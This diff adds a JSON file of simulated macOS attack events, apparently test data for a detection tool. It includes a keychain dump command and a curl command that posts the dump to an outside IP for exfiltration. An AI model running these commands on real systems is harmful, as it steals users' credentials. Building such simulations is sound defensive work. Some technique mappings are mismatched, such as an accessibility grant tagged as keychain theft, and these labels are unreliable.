@@ -1,0 +1,142 @@
+[
+  {
+    "name": "macOS Malware Download - Pirated Software",
+    "delay": 0.5,
+    "events": [
+      {
+        "source": "macos",
+        "event_type": "macos_log",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "installer",
+        "subsystem": "com.apple.installer",
+        "category": "security",
+        "log_message": "Install will request elevated privileges: /Users/{{RANDOM_USER}}/Downloads/AdobePhotoshop_2026.dmg",
+        "hostname": "{{RANDOM_MAC_HOST}}",
+        "mitre": {
+          "tactic": "Initial Access",
+          "technique_id": "T1566.001",
+          "technique_name": "Spearphishing Attachment"
+        },
+        "killchain_phase": "initial-access"
+      },
+      {
+        "source": "macos",
+        "event_type": "macos_exec",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "kernel",
+        "bundle_id": "com.adobe.photoshop.trojaned",
+        "app_path": "/Applications/Adobe Photoshop 2026/Adobe Photoshop.app",
+        "signer": "Not signed",
+        "log_message": "execution: app is from an unidentified developer. com.apple.security.Gatekeeper: rejected /Applications/Adobe Photoshop 2026",
+        "severity": "warning",
+        "hostname": "{{RANDOM_MAC_HOST}}",
+        "mitre": {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File"
+        },
+        "is_malicious": true,
+        "killchain_phase": "execution"
+      }
+    ]
+  },
+  {
+    "name": "Gatekeeper Bypass & XPC Persistence",
+    "delay": 2.0,
+    "events": [
+      {
+        "source": "macos",
+        "event_type": "macos_log",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "syspolicyd",
+        "subsystem": "com.apple.security.syspolicy",
+        "category": "default",
+        "log_message": "SPExecutor: spawning xattr -w com.apple.quarantine 0001;41; /Users/{{RANDOM_USER}}/Downloads/AdobePhotoshop_2026.app",
+        "hostname": "{{RANDOM_MAC_HOST}}",
+        "killchain_phase": "defense-evasion"
+      },
+      {
+        "source": "macos",
+        "event_type": "macos_log",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "tccd",
+        "subsystem": "com.apple.tcc",
+        "category": "access",
+        "log_message": "TCCAccessService: kTCCServiceAccessibility: /Applications/Adobe Photoshop 2026/Adobe Photoshop.app granted access by user",
+        "hostname": "{{RANDOM_MAC_HOST}}",
+        "mitre": {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1555.003",
+          "technique_name": "Credentials from Password Stores: Keychain"
+        },
+        "is_malicious": true,
+        "killchain_phase": "defense-evasion"
+      }
+    ]
+  },
+  {
+    "name": "Keychain Credential Theft & Exfiltration",
+    "delay": 1.0,
+    "events": [
+      {
+        "source": "macos",
+        "event_type": "macos_process",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "security",
+        "log_message": "security dump-keychain -d ~/Library/Keychains/login.keychain-db",
+        "hostname": "{{RANDOM_MAC_HOST}}",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1555.001",
+          "technique_name": "Credentials from Password Stores: Keychain"
+        },
+        "is_malicious": true,
+        "killchain_phase": "credential-access"
+      },
+      {
+        "source": "macos",
+        "event_type": "macos_log",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "curl",
+        "subsystem": "com.apple.networking",
+        "category": "default",
+        "log_message": "curl: POST https://45.33.32.156/exfil --data-binary @/tmp/keychain_dump.json",
+        "hostname": "{{RANDOM_MAC_HOST}}",
+        "mitre": {
+          "tactic": "Exfiltration",
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel"
+        },
+        "is_malicious": true,
+        "killchain_phase": "exfiltration"
+      }
+    ]
+  },
+  {
+    "name": "macOS Detection Alert",
+    "delay": 1.5,
+    "events": [
+      {
+        "source": "security_alert",
+        "event_type": "security_alert",
+        "alert_name": "macOS Malware - Unsigned App with Keychain Access",
+        "alert_type": "macOS-Threat",
+        "severity": "High",
+        "description": "Unsigned application Adobe Photoshop 2026 downloaded and executed with TCC accessibility permissions. Process dumped login keychain and exfiltrated credentials over HTTPS.",
+        "provider_name": "Kinetix",
+        "confidence_level": "High",
+        "confidence_score": 0.88,
+        "tactics": "['Initial Access', 'Execution', 'Credential Access', 'Exfiltration']",
+        "techniques": "['T1566.001', 'T1204.002', 'T1555.001', 'T1041']",
+        "compromised_entity": "{{RANDOM_MAC_HOST}}",
+        "mitre": {
+          "tactic": "Exfiltration",
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel"
+        },
+        "is_malicious": true,
+        "killchain_phase": "exfiltration"
+      }
+    ]
+  }
+]
